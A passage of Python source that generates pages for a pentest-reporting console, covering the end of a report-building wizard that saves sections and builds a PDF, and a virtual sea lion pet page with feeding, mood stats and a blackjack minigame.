  document.getElementById('w-summary').innerHTML=
    '<div style="border:1px solid var(--border);border-radius:8px;padding:14px;margin-top:8px;background:var(--bg)">'+
    '<div style="font-size:12px;color:var(--text2);margin-bottom:8px">Riepilogo automatico — '+fs.length+' finding totali:</div>'+
    '<div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center">'+
    sevBadge('critical')+' '+c.critical+' &nbsp; '+sevBadge('high')+' '+c.high+' &nbsp; '+
    sevBadge('medium')+' '+c.medium+' &nbsp; '+sevBadge('low')+' '+c.low+' &nbsp; '+
    sevBadge('info')+' '+c.info+'</div>'+
    '<div style="margin-top:14px;display:flex;gap:8px;flex-wrap:wrap">'+
    '<a class="btn" href="/report/view/'+SLUG+'" target="_blank">Anteprima completa</a>'+
    (DATA.pdf?'<a class="btn" href="/report/pdf/'+SLUG+'" target="_blank">Apri PDF</a>':'')+
    '<button class="btn btn-primary" onclick="buildPdf(this)">Genera PDF</button></div>'+
    '<div style="font-size:12px;color:var(--text2);margin-top:10px">Da console: <code>report edit '+SLUG+'</code> (VS Code) · <code>report build '+SLUG+'</code> (PDF)</div>'+
    '</div>';
}}
function buildPdf(btn){{
  btn.disabled=true;btn.textContent='Build…';
  saveStep(false,function(){{
    fetch('/api/report/build',{{method:'POST',headers:{{'Content-Type':'application/json'}},
      body:JSON.stringify({{slug:SLUG}})
    }}).then(r=>r.json()).then(d=>{{
      btn.disabled=false;btn.textContent='Genera PDF';
      if(d.ok){{alert('PDF generato!');loadData();}}else alert('Build fallito:\\n'+(d.error||'errore'));
    }}).catch(()=>{{btn.disabled=false;btn.textContent='Genera PDF';alert('Errore di rete');}});
  }});
}}

// ---- Salvataggio step ----
function saveStep(advance,cb){{
  var s=STEPS[CUR].id;
  var done=function(ok,msg){{
    if(cb){{cb();return;}}
    if(ok&&advance&&CUR<STEPS.length-1)go(CUR+1);
    else if(ok)loadData(true);
    else if(msg)alert(msg);
  }};
  if(s==='info'){{
    var client=gv('w-client');
    if(!client){{alert('Il nome del cliente è obbligatorio.');return;}}
    DATA.meta.client=client;DATA.meta.rtype=gv('w-rtype');DATA.meta.domain=gv('w-domain');
    postMeta(done);
  }} else if(s==='approccio'){{
    DATA.meta.box=gv('w-box');DATA.meta.date_start=gv('w-dstart');DATA.meta.date_end=gv('w-dend');
    DATA.meta.time_start=gv('w-tstart');DATA.meta.time_end=gv('w-tend');
    postMeta(done);
  }} else if(s==='perimetro'){{
    DATA.meta.scope=DATA.meta.scope.filter(function(r){{return r.host.trim()||r.desc.trim();}});
    postMeta(done);
  }} else if(s==='findings'){{
    done(true); // i finding si salvano singolarmente
  }} else if(s==='walkthrough'){{
    saveSection('compromissione',document.getElementById('w-compromissione').value,function(){{
      saveSection('walkthrough',document.getElementById('w-walkthrough').value,function(){{done(true);}});
    }});
  }} else if(s==='remediation'){{
    saveSection('remediation_breve',document.getElementById('w-rem-breve').value,function(){{
      saveSection('remediation_medio',document.getElementById('w-rem-medio').value,function(){{
        saveSection('remediation_lungo',document.getElementById('w-rem-lungo').value,function(){{done(true);}});
      }});
    }});
  }} else if(s==='appendici'){{
    saveSection('appendice_host',document.getElementById('w-app-host').value,function(){{
      saveSection('appendice_utenti',document.getElementById('w-app-utenti').value,function(){{
        saveSection('appendice_bonifica',document.getElementById('w-app-bonifica').value,function(){{
          saveSection('appendice_password',document.getElementById('w-app-password').value,function(){{done(true);}});
        }});
      }});
    }});
  }} else if(s==='stile'){{
    DATA.meta.style=DATA.meta.style||{{}};
    DATA.meta.style.preset=gv('w-preset');
    DATA.meta.style.color='';
    DATA.meta.style.color2='';
    DATA.meta.style.author=gv('w-author');
    DATA.meta.style.company=gv('w-company');
    DATA.meta.style.role=gv('w-role');
    postMeta(done);
  }} else if(s==='markdown'){{
    fetch('/api/report/raw',{{method:'POST',headers:{{'Content-Type':'application/json'}},
      body:JSON.stringify({{slug:SLUG,content:document.getElementById('w-md').value}})
    }}).then(r=>r.json()).then(d=>done(d.ok,d.error)).catch(()=>done(false,'Errore di rete'));
  }} else if(s==='finale'){{
    saveSection('considerazioni',document.getElementById('w-considerazioni').value,function(){{done(true);}});
  }}
}}
function postMeta(done){{
  fetch('/api/report/meta',{{method:'POST',headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify({{slug:SLUG,meta:DATA.meta}})
  }}).then(r=>r.json()).then(d=>done(d.ok,d.error)).catch(()=>done(false,'Errore di rete'));
}}
function saveSection(name,content,done){{
  fetch('/api/report/section',{{method:'POST',headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify({{slug:SLUG,section:name,content:content}})
  }}).then(r=>r.json()).then(d=>done(d.ok,d.error)).catch(()=>done(false,'Errore di rete'));
}}

function loadData(stay){{
  fetch('/api/report/data?slug='+encodeURIComponent(SLUG))
  .then(r=>r.json()).then(d=>{{
    if(!d.ok){{document.getElementById('wiz-panel').innerHTML='<p style="color:var(--red)">'+esc(d.error)+'</p>';return;}}
    DATA=d;
    if(!stay)renderNav(),renderStep();
    else refreshPreview();
  }});
}}
loadData();
</script>"""
    return _base_html(f"Wizard — {client_e}", body, active="report")


def _page_pet() -> str:
    import json as _json
    from lib.pet import (
        _FISH, _PET_SPIN_FRAMES, _PET_HAPPY_LINES, _PET_ANNOY_LINES,
        _PET_SAD_LINE, _8BALL_ANSWERS, _WORDLE_WORDS,
    )
    fish_js = _json.dumps(_FISH, ensure_ascii=False)
    spin_js = _json.dumps(_PET_SPIN_FRAMES, ensure_ascii=False)
    happy_js = _json.dumps(_PET_HAPPY_LINES, ensure_ascii=False)
    annoy_js = _json.dumps(_PET_ANNOY_LINES, ensure_ascii=False)
    sad_js = _json.dumps(_PET_SAD_LINE, ensure_ascii=False)
    ball_js = _json.dumps(_8BALL_ANSWERS, ensure_ascii=False)
    wordle_js = _json.dumps(_WORDLE_WORDS, ensure_ascii=False)

    seal_art = html.escape(_load_seal_art())
    wag_frames = _load_wag_frames()
    wag_frames_js = _json.dumps(wag_frames, ensure_ascii=False)
    bark_frames = _load_bark_frames()
    bark1_js = _json.dumps(bark_frames[0], ensure_ascii=False)
    bark2_js = _json.dumps(bark_frames[1], ensure_ascii=False)
    tips = _load_tips()
    tip = random.choice(tips) if tips else "SeaLion"
    ver = _sl_version_hash()
    body = f"""\
<style>
.pet-float-msg{{position:absolute;pointer-events:none;font-weight:700;font-size:15px;white-space:nowrap;z-index:10;animation:petFloatUp 1.8s ease-out forwards}}
@keyframes petFloatUp{{0%{{opacity:1;transform:translateY(0)}}100%{{opacity:0;transform:translateY(-50px)}}}}
.pet-fish-swim{{position:absolute;white-space:pre;font-family:'Courier New',monospace;font-size:10px;color:var(--green,#2ecc71);pointer-events:none;z-index:5;animation:petFishSwim 2.2s linear forwards}}
@keyframes petFishSwim{{0%{{right:-130px;opacity:0}}8%{{opacity:1}}75%{{opacity:1}}100%{{right:60%;opacity:0}}}}
.pet-action-btn{{display:block;width:100%;text-align:left;background:none;border:1px solid var(--border);color:var(--text);padding:7px 12px;border-radius:4px;cursor:pointer;font-size:13px;font-family:inherit;transition:border-color .15s,color .15s}}
.pet-action-btn:hover{{border-color:var(--accent);color:var(--accent)}}
.pet-stat-bar{{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2)}}
.pet-stat-bar .bar{{flex:1;height:6px;background:var(--border);border-radius:3px;overflow:hidden}}
.pet-stat-bar .fill{{height:100%;border-radius:3px;transition:width .4s,background .4s}}
.pet-stat-bar .pct{{width:30px;text-align:right}}
.pet-sidebar-name{{color:var(--accent);cursor:pointer;font-weight:600}}
.pet-sidebar-name:hover{{text-decoration:underline}}
.pet-name-input{{background:var(--bg);border:1px solid var(--accent);border-radius:4px;padding:2px 6px;color:var(--accent);font-size:13px;font-family:inherit;outline:none;width:100%}}
.seal-scene{{position:relative}}
.shake-anim{{animation:shakeIt .5s ease-in-out}}
@keyframes shakeIt{{0%,100%{{transform:translateX(0)}}20%{{transform:translateX(-6px)}}40%{{transform:translateX(6px)}}60%{{transform:translateX(-4px)}}80%{{transform:translateX(4px)}}}}
.bj-cards{{display:flex;gap:6px;flex-wrap:wrap;margin:8px 0}}
.bj-card{{width:50px;height:70px;background:var(--bg);border:2px solid var(--border);border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:700;color:var(--text);position:relative}}
.bj-card.red{{color:var(--red,#e74c3c)}}
.bj-card.hidden{{background:var(--surface);color:var(--border)}}
.wordle-grid{{display:flex;flex-direction:column;gap:3px;margin:8px 0}}
.wordle-row{{display:flex;gap:3px}}
.wordle-cell{{width:40px;height:40px;border:2px solid var(--border);border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:700;text-transform:uppercase;color:var(--text)}}
.wordle-cell.correct{{background:var(--green,#2ecc71);border-color:var(--green,#2ecc71);color:#fff}}
.wordle-cell.present{{background:var(--yellow,#f39c12);border-color:var(--yellow,#f39c12);color:#fff}}
.wordle-cell.absent{{background:var(--text2);border-color:var(--text2);color:#fff;opacity:.6}}
.wordle-cell.filled{{border-color:var(--text2)}}
.wordle-kb{{display:flex;flex-direction:column;gap:3px;margin:8px 0}}
.wordle-kb-row{{display:flex;gap:3px}}
.wordle-key{{min-width:28px;height:34px;border:1px solid var(--border);border-radius:4px;background:var(--surface);color:var(--text);font-size:12px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;padding:0 6px;text-transform:uppercase;font-family:inherit}}
.wordle-key:hover{{background:var(--bg);border-color:var(--text2)}}
.wordle-key.correct{{background:var(--green,#2ecc71);border-color:var(--green,#2ecc71);color:#fff}}
.wordle-key.present{{background:var(--yellow,#f39c12);border-color:var(--yellow,#f39c12);color:#fff}}
.wordle-key.absent{{background:var(--text2);border-color:var(--text2);color:#fff;opacity:.5}}
.wordle-key.wide{{min-width:46px;font-size:10px}}
.ball-circle{{width:100px;height:100px;border-radius:50%;background:linear-gradient(135deg,#1a1a2e,#16213e);border:3px solid var(--accent);display:flex;align-items:center;justify-content:center;margin:12px auto}}
.ball-circle.shaking{{animation:ballShake .6s ease-in-out}}
@keyframes ballShake{{0%,100%{{transform:rotate(0)}}20%{{transform:rotate(-8deg)}}40%{{transform:rotate(8deg)}}60%{{transform:rotate(-5deg)}}80%{{transform:rotate(5deg)}}}}
.ball-inner{{width:40px;height:40px;border-radius:50%;background:var(--accent);display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:700;color:#fff}}
.spin-art{{font-family:'Courier New',monospace;font-size:12px;line-height:1.2;color:var(--accent);white-space:pre;text-align:center}}
.spin-art.rolling{{animation:barrelRoll .8s ease-in-out}}
@keyframes barrelRoll{{0%{{transform:rotate(0)}}100%{{transform:rotate(360deg)}}}}
</style>

<div class="home-layout">
<div class="sidebar">
  <div class="info-box">
    <div class="label">Versione:</div>
    <div class="value">v{ver}</div>
  </div>
  <div class="info-box">
    <div class="label">Statistiche Sealion</div>
    <div style="margin-top:6px">
      <div class="pet-sidebar-name" id="pet-name-display"></div>
      <div style="margin-top:8px;display:flex;flex-direction:column;gap:6px">
        <div class="pet-stat-bar"><span style="width:55px;flex-shrink:0">Felicità</span><div class="bar"><div class="fill" id="bar-happy"></div></div><span class="pct" id="val-happy"></span></div>
        <div class="pet-stat-bar"><span style="width:55px;flex-shrink:0">Sazietà</span><div class="bar"><div class="fill" id="bar-full"></div></div><span class="pct" id="val-full"></span></div>
      </div>
      <div id="pet-mood" style="font-size:12px;color:var(--text2);margin-top:6px"></div>
    </div>
  </div>
  <div class="info-box">
    <div class="label">Azioni:</div>
    <div style="display:flex;flex-direction:column;gap:4px;margin-top:6px">
      <button class="pet-action-btn" data-cmd="feed">Feed</button>
      <button class="pet-action-btn" data-cmd="games">Games</button>
      <button class="pet-action-btn" data-cmd="minigame">Pentest Minigame</button>
      <button class="pet-action-btn" data-cmd="annoy">Annoy</button>
      <button class="pet-action-btn" data-cmd="spin">Spin</button>
    </div>
  </div>
  <div class="info-box">
    <div class="label">SeaLion Pet:</div>
    <a href="/" style="color:var(--accent);font-size:13px">Torna alla console</a>
  </div>
</div>
<div class="main-area">
  <div class="seal-container">
    <div class="seal-scene" id="seal-scene">
      <pre class="seal-art" id="pet-art">{seal_art}</pre>
      <div class="seal-bubble-wrap">
        <div class="seal-bubble" id="pet-bubble">{html.escape(tip)}</div>
      </div>
    </div>
  </div>
  <div class="terminal-input">
    <div id="term-output"></div>
    <div class="suggestions" id="suggestions"></div>
    <div class="prompt-line">
      <span class="user">user@slweb</span>:<span class="path">~</span>$&nbsp;
      <input type="text" id="term-input" placeholder="feed, play, games, minigame, spin, help..." autocomplete="off" spellcheck="false">
    </div>
  </div>
</div>
</div>

<script>
(function(){{
const FISH={fish_js};
const SPIN_FRAMES={spin_js};
const HAPPY_LINES={happy_js};
const ANNOY_LINES={annoy_js};
const SAD_LINE={sad_js};
const BALL_ANSWERS={ball_js};
const WORDLE_WORDS={wordle_js};

function loadPet(){{
  var raw=localStorage.getItem('sl_pet');
  var pet=raw?JSON.parse(raw):{{name:'SeaLion',happiness:50,fullness:50,last_fed:'',updated:0}};
  var u=parseFloat(pet.updated)||0;
  var el=u>0?Math.max(0,Date.now()/1000-u):0;
  var tk=Math.floor(el/600);
  if(tk>0){{pet.happiness=Math.max(0,(pet.happiness||50)-tk);pet.fullness=Math.max(0,(pet.fullness||50)-tk);}}
  pet.happiness=Math.min(100,Math.max(0,pet.happiness||0));
  pet.fullness=Math.min(100,Math.max(0,pet.fullness||0));
  return pet;
}}
function savePet(pet){{
  pet.updated=Date.now()/1000;
  localStorage.setItem('sl_pet',JSON.stringify(pet));
  fetch('/api/pet',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify(pet)}}).catch(function(){{}});
}}
function syncFromServer(){{
  fetch('/api/pet').then(function(r){{return r.json();}}).then(function(srv){{
    var u=parseFloat(srv.updated)||0;
    var lu=parseFloat(pet.updated)||0;
    if(u>lu){{
      var el=u>0?Math.max(0,Date.now()/1000-u):0;
      var tk=Math.floor(el/600);
      if(tk>0){{srv.happiness=Math.max(0,(srv.happiness||50)-tk);srv.fullness=Math.max(0,(srv.fullness||50)-tk);}}
      srv.happiness=Math.min(100,Math.max(0,srv.happiness||0));
      srv.fullness=Math.min(100,Math.max(0,srv.fullness||0));
      pet=srv;localStorage.setItem('sl_pet',JSON.stringify(pet));updateUI();
    }}
  }}).catch(function(){{}});
}}
function addStat(pet,key,d){{pet[key]=Math.min(100,Math.max(0,(pet[key]||0)+d));}}
function getMood(h){{if(h>=80)return'Estasiato';if(h>=60)return'Contento';if(h>=40)return'Ok';if(h>0)return'Triste';return SAD_LINE;}}
function barColor(v){{return v>=60?'var(--green,#2ecc71)':v>=30?'var(--yellow,#f39c12)':'var(--red,#e74c3c)';}}

var pet=loadPet();
savePet(pet);
syncFromServer();

var artEl=document.getElementById('pet-art');
var scene=document.getElementById('seal-scene');
var out=document.getElementById('term-output');
var input=document.getElementById('term-input');
var box=document.getElementById('suggestions');

function updateUI(){{
  var h=pet.happiness,f=pet.fullness;
  document.getElementById('bar-happy').style.width=h+'%';
  document.getElementById('bar-happy').style.background=barColor(h);
  document.getElementById('bar-full').style.width=f+'%';
  document.getElementById('bar-full').style.background=barColor(f);
  document.getElementById('val-happy').textContent=h+'%';
  document.getElementById('val-full').textContent=f+'%';
  document.getElementById('pet-mood').innerHTML='Umore: <strong>'+getMood(h)+'</strong>';
}}

var nameEl=document.getElementById('pet-name-display');
nameEl.textContent=pet.name||'SeaLion';
nameEl.onclick=function(){{
  var inp=document.createElement('input');
  inp.className='pet-name-input';
  inp.value=pet.name;
  inp.maxLength=24;
  nameEl.replaceWith(inp);
  inp.focus();inp.select();
  function done(){{
    var v=inp.value.trim()||'SeaLion';
    pet.name=v.substring(0,24);savePet(pet);
    var n=document.createElement('div');
    n.className='pet-sidebar-name';n.id='pet-name-display';
    n.textContent=pet.name;n.onclick=nameEl.onclick;
    inp.replaceWith(n);nameEl=n;
    setBubble(pet.name+' ha un nuovo nome!');
  }}
  inp.onblur=done;
  inp.onkeydown=function(e){{if(e.key==='Enter')done();}};
}};

/* --- WAG (homepage style: mousedown/up) --- */
var wagFrames={wag_frames_js};
var wagSeq=[2,3,4,3,2,1,0,1];
var origArt=artEl.textContent;
var wagTid=null,wagFi=0;
function wagStep(){{artEl.textContent=wagFrames[wagSeq[wagFi%wagSeq.length]];wagFi++;}}
function wagStart(e){{e.preventDefault();if(wagTid||barking)return;wagFi=0;wagStep();wagTid=setInterval(wagStep,200);}}
function wagStop(noBark){{if(wagTid){{clearInterval(wagTid);wagTid=null;}}if(noBark!==true){{doBark();}}else{{artEl.textContent=origArt;}}}}
artEl.addEventListener('mousedown',wagStart);
artEl.addEventListener('mouseup',wagStop);
artEl.addEventListener('mouseleave',function(){{if(wagTid){{clearInterval(wagTid);wagTid=null;}}artEl.textContent=origArt;}});
artEl.addEventListener('touchstart',wagStart,{{passive:false}});
artEl.addEventListener('touchend',wagStop);
artEl.style.cursor='pointer';

/* --- BARK after activity --- */
var barkFrame1={bark1_js};
var barkFrame2={bark2_js};
var barking=false;
function doBark(){{
  barking=true;
  artEl.textContent=origArt;
  var seq=[barkFrame1,barkFrame2,barkFrame1,barkFrame2,barkFrame1,barkFrame2,barkFrame1,barkFrame2];
  var i=0;
  var tid=setInterval(function(){{
    if(i<seq.length){{artEl.textContent=seq[i];i++;}}
    else{{clearInterval(tid);artEl.textContent=origArt;barking=false;}}
  }},200);
}}

function setBubble(msg){{document.getElementById('pet-bubble').textContent=msg;}}

function floatMsg(text,color){{
  var el=document.createElement('div');
  el.className='pet-float-msg';
  el.style.color=color||'var(--green,#2ecc71)';
  el.textContent=text;
  el.style.left=Math.floor(Math.random()*40+20)+'%';
  el.style.top='10%';
  scene.appendChild(el);
  setTimeout(function(){{el.remove();}},1900);
}}

function spawnFish(fish){{
  var el=document.createElement('pre');
  el.className='pet-fish-swim';
  el.textContent=fish.art.join('\\n');
  el.style.bottom='20%';
  scene.appendChild(el);
  setTimeout(function(){{el.remove();}},2300);
}}

updateUI();

/* --- TERMINAL --- */
var cmds=['feed','play','games','minigame','spin','annoy','help','stats','clear','blackjack','wordle','guess','8ball'];
var hist=[],hpos=-1;
var sel=-1;
var activeGame=null;

function showSuggestions(val){{
  if(!val){{box.innerHTML='';box.classList.remove('open');sel=-1;return;}}
  var m=cmds.filter(function(c){{return c.indexOf(val)===0&&c!==val;}});
  if(val.indexOf('name ')===0)m=[];
  if(!m.length){{box.innerHTML='';box.classList.remove('open');sel=-1;return;}}
  box.innerHTML=m.map(function(c,i){{return'<div class="sg'+(i===sel?' sel':'')+'" data-i="'+i+'">'+c+'</div>';}}).join('');
  box.classList.add('open');
  box.querySelectorAll('.sg').forEach(function(s){{s.onclick=function(){{input.value=s.textContent;box.innerHTML='';box.classList.remove('open');sel=-1;input.focus();}}}});
}}

input.addEventListener('input',function(){{sel=-1;showSuggestions(input.value.trim().toLowerCase());}});
input.addEventListener('keydown',function(e){{
  var items=box.querySelectorAll('.sg');
  if(e.key==='ArrowDown'&&items.length){{e.preventDefault();sel=Math.min(sel+1,items.length-1);showSuggestions(input.value.trim().toLowerCase());return;}}
  if(e.key==='ArrowUp'){{
    if(items.length&&sel>0){{e.preventDefault();sel--;showSuggestions(input.value.trim().toLowerCase());return;}}
    if(!items.length||sel<=0){{e.preventDefault();if(hpos<0)hpos=hist.length;if(hpos>0){{hpos--;input.value=hist[hpos];}}return;}}
  }}
  if(e.key==='ArrowDown'&&!items.length){{e.preventDefault();if(hpos>=0&&hpos<hist.length-1){{hpos++;input.value=hist[hpos];}}else{{hpos=-1;input.value='';}}return;}}
  if(e.key==='Enter'){{
    e.preventDefault();
    var suggestion=!activeGame&&box.classList.contains('open')&&items.length?items[Math.max(sel,0)]:null;
    var raw=suggestion?suggestion.textContent.trim():input.value.trim();
    if(!raw)return;
    input.value='';box.innerHTML='';box.classList.remove('open');sel=-1;
    hist.push(raw);hpos=-1;
    runCmd(raw.toLowerCase(),raw);
  }}
  if(e.key==='Escape'){{box.innerHTML='';box.classList.remove('open');sel=-1;}}
}});

document.addEventListener('click',function(e){{if(!e.target.closest('.terminal-input')){{box.classList.remove('open');}}}});

function termOut(html){{out.innerHTML=html;}}

function runCmd(cmd,raw){{
  if(activeGame){{
    activeGame.handle(cmd,raw);
    return;
  }}
  if(cmd==='clear'){{out.innerHTML='';return;}}
  if(cmd==='help'){{
    termOut(
      '<span class="t-head">SeaLion Pet — Comandi</span>\\n\\n'+
      '  <span class="t-accent">feed</span>       <span class="t-line">Pesca un pesce e nutri il sealion</span>\\n'+
      '  <span class="t-accent">play</span>       <span class="t-line">Gioca col sealion (+12 felicità, -6 sazietà)</span>\\n'+
      '  <span class="t-accent">spin</span>       <span class="t-line">Barrel roll! (+6 felicità)</span>\\n'+
      '  <span class="t-accent">annoy</span>      <span class="t-line">Infastidisci il sealion (-5 felicità)</span>\\n'+
      '  <span class="t-accent">games</span>      <span class="t-line">Minigiochi: blackjack, wordle, guess, 8ball</span>\\n'+
      '  <span class="t-accent">minigame</span>   <span class="t-line">Quiz fullscreen per colloquio pentesting</span>\\n'+
      '  <span class="t-accent">stats</span>      <span class="t-line">Mostra le statistiche del pet</span>\\n'+
      '  <span class="t-accent">name</span> <span class="t-line">&lt;nome&gt;</span>  <span class="t-line">Rinomina il pet</span>\\n'+
      '  <span class="t-accent">clear</span>      <span class="t-line">Pulisci il terminale</span>\\n'
    );
    return;
  }}
  if(cmd==='stats'){{
    termOut(
      '<span class="t-head">'+pet.name+' — Statistiche</span>\\n\\n'+
      '  <span class="t-accent">Felicità</span>  <span class="t-line">'+pet.happiness+'%</span>\\n'+
      '  <span class="t-accent">Sazietà</span>   <span class="t-line">'+pet.fullness+'%</span>\\n'+
      '  <span class="t-accent">Umore</span>     <span class="t-line">'+getMood(pet.happiness)+'</span>\\n'
    );
    return;
  }}
  if(cmd.indexOf('name ')===0){{
    var nn=raw.substring(5).trim().substring(0,24)||'SeaLion';
    pet.name=nn;savePet(pet);
    nameEl.textContent=pet.name;
    setBubble(pet.name+' ha un nuovo nome!');
    termOut('<span class="t-grn">&#10003;</span> <span class="t-line">Rinominato in <span class="t-accent">'+pet.name+'</span></span>');
    return;
  }}
  if(cmd==='feed'){{doFeed();return;}}
  if(cmd==='play'){{doPlay();return;}}
  if(cmd==='spin'){{doSpin();return;}}
  if(cmd==='annoy'){{doAnnoy();return;}}
  if(cmd==='games'){{showGames();return;}}
  if(cmd==='minigame'){{var bm=document.querySelector('meta[name="base-path"]');location.href=(bm?bm.content:'/')+'pet/minigame';return;}}
  if(cmd==='blackjack'){{initBlackjack();return;}}
  if(cmd==='wordle'){{initWordle();return;}}
  if(cmd==='guess'){{initGuess();return;}}
  if(cmd==='8ball'){{init8Ball();return;}}
  if(cmd==='back'){{
    activeGame=null;
    showGames();
    return;
  }}
  termOut('<span class="t-line">Comando sconosciuto: <span class="t-accent">'+cmd+'</span> — scrivi <span class="t-accent">help</span> per la lista</span>');
}}

/* sidebar buttons */
document.querySelectorAll('.pet-action-btn').forEach(function(btn){{
  btn.addEventListener('click',function(){{
    runCmd(btn.dataset.cmd,btn.dataset.cmd);
    input.focus();
  }});
}});

/* --- FEED --- */
function doFeed(){{
  var fish=FISH[Math.floor(Math.random()*FISH.length)];
  spawnFish(fish);
  addStat(pet,'fullness',fish.value);
  addStat(pet,'happiness',5);
  pet.last_fed=new Date().toISOString().split('T')[0];
  savePet(pet);updateUI();
  setBubble('AAAAAA!');
  floatMsg('+'+fish.value+'% sazietà','var(--green,#2ecc71)');
  setTimeout(function(){{floatMsg('+5% felicità','var(--yellow,#f39c12)');}},400);
  termOut('<span class="t-grn">&#10003;</span> <span class="t-accent">'+fish.name+'</span> <span class="t-line">— +'+fish.value+'% sazietà, +5% felicità</span>');
  doBark();
}}

/* --- PLAY --- */
function doPlay(){{
  addStat(pet,'happiness',12);
  addStat(pet,'fullness',-6);
  savePet(pet);updateUI();
  if(wagTid){{clearInterval(wagTid);wagTid=null;}}
  wagFi=0;wagStep();wagTid=setInterval(wagStep,200);
  setTimeout(function(){{wagStop(true);}},1600);
  var reaction=pet.happiness===0?SAD_LINE:HAPPY_LINES[Math.floor(Math.random()*HAPPY_LINES.length)];
  setBubble(reaction);
  floatMsg('+12% felicità','var(--yellow,#f39c12)');
  setTimeout(function(){{floatMsg('-6% sazietà','var(--red,#e74c3c)');}},400);
  termOut('<span class="t-grn">&#10003;</span> <span class="t-line">Giocato con '+pet.name+' (+12 felicità, -6 sazietà)</span>');
  doBark();
}}

/* --- SPIN --- */
function doSpin(){{
  var i=0,rounds=12;
  var spinPre=document.createElement('pre');
  spinPre.className='spin-art rolling';
  termOut('');
  out.appendChild(spinPre);
  var iv=setInterval(function(){{
    spinPre.textContent=SPIN_FRAMES[i%SPIN_FRAMES.length].join('\\n');
    i++;
    if(i>=rounds){{
      clearInterval(iv);
      spinPre.classList.remove('rolling');
      addStat(pet,'happiness',6);savePet(pet);updateUI();
      var r=HAPPY_LINES[Math.floor(Math.random()*HAPPY_LINES.length)];
      setBubble(r);
      floatMsg('+6% felicità','var(--yellow,#f39c12)');
      termOut('<span class="t-grn">&#10003;</span> <span class="t-line">'+r+' (+6 felicità)</span>');
      doBark();
    }}
  }},150);
}}

/* --- ANNOY --- */
function doAnnoy(){{
  addStat(pet,'happiness',-5);savePet(pet);updateUI();
  var phrase=ANNOY_LINES[Math.floor(Math.random()*ANNOY_LINES.length)].replace('{{name}}',pet.name);
  setBubble(phrase);
  scene.classList.add('shake-anim');
  setTimeout(function(){{scene.classList.remove('shake-anim');}},500);
  floatMsg('-5% felicità','var(--red,#e74c3c)');
  termOut('<span style="color:var(--red,#e74c3c)">&#10007;</span> <span class="t-line">'+phrase+'</span>');
  doBark();
}}

/* --- GAMES --- */
function gameReward(won){{
  var d=won===true?18:won==='draw'?8:4;
  addStat(pet,'happiness',d);savePet(pet);updateUI();
  setBubble(pet.happiness===0?SAD_LINE:HAPPY_LINES[Math.floor(Math.random()*HAPPY_LINES.length)]);
  var note=won===true?'Vittoria! +18 felicità':won==='draw'?'Pareggio +8 felicità':'Perso, +4 felicità';
  floatMsg('+'+(won===true?18:won==='draw'?8:4)+' felicità','var(--yellow,#f39c12)');
  doBark();
  return note;
}}

function showGames(){{
  activeGame=null;
  termOut(
    '<span class="t-head">Minigiochi</span>\\n\\n'+
    '  <span class="t-accent">blackjack</span>  <span class="t-line">Hit o Stand contro il sealion</span>\\n'+
    '  <span class="t-accent">wordle</span>     <span class="t-line">Indovina la parola in 6 tentativi</span>\\n'+
    '  <span class="t-accent">guess</span>      <span class="t-line">Numero 1-100 in 7 tentativi</span>\\n'+
    '  <span class="t-accent">8ball</span>      <span class="t-line">Chiedi al sealion del futuro</span>\\n\\n'+
    '  <span class="t-accent">minigame</span>   <span class="t-line">500 domande per il colloquio pentesting</span>\\n\\n'+
    '<span class="t-line">Digita il nome del gioco per iniziare. <span class="t-accent">back</span> per tornare.</span>'
  );
}}

/* -- BLACKJACK -- */
function initBlackjack(){{
  var suits=['\\u2660','\\u2665','\\u2666','\\u2663'];
  var ranks=['A','2','3','4','5','6','7','8','9','10','J','Q','K'];
  var deck=[];
  for(var s=0;s<suits.length;s++)for(var r=0;r<ranks.length;r++)deck.push({{rank:ranks[r],suit:suits[s],red:s===1||s===2}});
  for(var i=deck.length-1;i>0;i--){{var j=Math.floor(Math.random()*(i+1));var t=deck[i];deck[i]=deck[j];deck[j]=t;}}
  var di=0;
  function draw(){{return deck[di++];}}
  function cardVal(c){{if('JQK'.indexOf(c.rank)>=0)return 10;if(c.rank==='A')return 11;return parseInt(c.rank);}}
  function handTotal(h){{var t=0,a=0;for(var i=0;i<h.length;i++){{t+=cardVal(h[i]);if(h[i].rank==='A')a++;}}while(t>21&&a){{t-=10;a--;}}return t;}}
  function renderCard(c,hidden){{
    if(hidden)return'<div class="bj-card hidden">?</div>';
    return'<div class="bj-card'+(c.red?' red':'')+'">'+c.rank+'<span style="font-size:10px;position:absolute;bottom:2px;right:3px">'+c.suit+'</span></div>';
  }}
  var player=[draw(),draw()],dealer=[draw(),draw()];
  var over=false;

  function render(showD){{
    var h='<span class="t-head">Blackjack</span>\\n\\n';
    h+='<span class="t-line">Dealer:</span> ';
    h+='<div class="bj-cards">';
    for(var i=0;i<dealer.length;i++)h+=renderCard(dealer[i],!showD&&i===1);
    h+='</div>';
    if(showD)h+='<span class="t-line">Totale: '+handTotal(dealer)+'</span>\\n';
    h+='<span class="t-line">Tu:</span> ';
    h+='<div class="bj-cards">';
    for(var i=0;i<player.length;i++)h+=renderCard(player[i],false);
    h+='</div>';
    h+='<span class="t-line">Totale: '+handTotal(player)+'</span>\\n';
    if(!over)h+='\\n<span class="t-line">Digita <span class="t-accent">hit</span> o <span class="t-accent">stand</span></span>';
    out.innerHTML=h;
  }}

  function finish(){{
    over=true;
    while(handTotal(dealer)<17)dealer.push(draw());
    render(true);
    var pt=handTotal(player),dt=handTotal(dealer);
    var msg='',won;
    if(pt>21){{msg='<span style="color:var(--red,#e74c3c)">Sballato! Hai perso.</span>';won=false;}}
    else if(dt>21){{msg='<span style="color:var(--green,#2ecc71)">Dealer sballato! Hai vinto!</span>';won=true;}}
    else if(pt>dt){{msg='<span style="color:var(--green,#2ecc71)">Hai vinto!</span>';won=true;}}
    else if(pt===dt){{msg='<span style="color:var(--yellow,#f39c12)">Pareggio!</span>';won='draw';}}
    else{{msg='<span style="color:var(--red,#e74c3c)">Ha vinto il dealer!</span>';won=false;}}
    var note=gameReward(won);
    out.innerHTML+='\\n'+msg+'\\n<span class="t-line">'+note+'</span>\\n\\n<span class="t-line">Digita <span class="t-accent">back</span> per tornare ai giochi</span>';
    activeGame=null;
  }}

  render(false);
